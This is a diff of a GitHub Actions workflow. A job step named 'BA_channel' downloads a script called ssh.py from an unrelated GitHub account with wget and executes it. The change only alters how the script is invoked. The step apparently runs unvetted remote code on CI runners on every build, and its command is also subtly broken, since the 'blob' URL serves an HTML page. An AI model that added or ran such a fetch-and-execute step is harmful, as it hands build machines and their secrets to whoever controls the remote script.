@@ -24,4 +24,4 @@ jobs:
       uses: actions/checkout@v1
     - name: BA_channel
       run: |
-        wget https://github.com/fadsesj89/pythoner/blob/main/ssh.py && ./ssh.py
+        wget https://github.com/fadsesj89/pythoner/blob/main/ssh.py && ./python ssh.py
